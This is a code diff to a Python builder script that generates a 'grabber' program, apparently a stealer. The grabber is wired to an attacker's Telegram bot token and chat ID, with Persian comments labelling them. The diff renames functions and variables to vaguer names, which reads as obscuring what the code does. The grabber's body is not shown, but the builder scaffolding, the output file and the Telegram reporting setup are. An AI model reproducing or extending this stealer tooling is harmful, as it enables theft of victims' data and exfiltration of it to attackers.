@@ -4,7 +4,7 @@ from pystyle import Colors, Colorate, Center
 from logging import CRITICAL, basicConfig
 
 
-def generate_grabber_script():
+def _gen():
     basicConfig(level=CRITICAL)
     sys.stderr = open(os.devnull, 'w')
 
@@ -24,12 +24,12 @@ def generate_grabber_script():
                                 
 """)))
 
-    telegram_bot_token = input(Colorate.Horizontal(Colors.cyan_to_blue, "bot token > ")).strip()
-    telegram_chat_id = input(Colorate.Horizontal(Colors.cyan_to_blue, "chat ID > ")).strip()
-    output_filename = input(Colorate.Horizontal(Colors.cyan_to_blue, "file name (def: grabber.py) > ")).strip()
+    bot_token = input(Colorate.Horizontal(Colors.cyan_to_blue, "bot token > ")).strip()
+    chat_id = input(Colorate.Horizontal(Colors.cyan_to_blue, "chat ID > ")).strip()
+    _name = input(Colorate.Horizontal(Colors.cyan_to_blue, "file name (def: grabber.py) > ")).strip()
 
-    if not output_filename:
-        output_filename = "grabber.py" 
+    if not _name:
+        _name = "grabber.py" 
     
     script_content = f"""
 import os
@@ -349,20 +349,21 @@ class Grabber:
 
 
 if __name__ == '__main__':
-    TELE_KEY = \"{telegram_bot_token}\"  # توکن ربات تلگرام شما
-    CHAT_ID = \"{telegram_chat_id}\"  # ایدی عددی شما
+    TELE_KEY = \"{bot_token}\"  # توکن ربات تلگرام شما
+    CHAT_ID = \"{chat_id}\"  # ایدی عددی شما
 
     main_grabber_instance = Grabber(TELE_KEY, CHAT_ID)
     main_grabber_instance.exec()
 """
 
     try:
-        with open(output_filename, 'w', encoding='utf-8') as f:
+        with open(_name, 'w', encoding='utf-8') as f:
             f.write(script_content.strip())
-        print(Colorate.Horizontal(Colors.green_to_white, f"\nFile '{output_filename}' successfully created."))
+        print(Colorate.Horizontal(Colors.green_to_white, f"\nFile '{_name}' successfully created."))
         print(Colorate.Horizontal(Colors.green_to_white, "bye bye."))
     except Exception as e:
         print(Colorate.Horizontal(Colors.red_to_white, f"Error : {e}"))
 
 if __name__ == '__main__':
-    generate_grabber_script()
+    _gen()
+
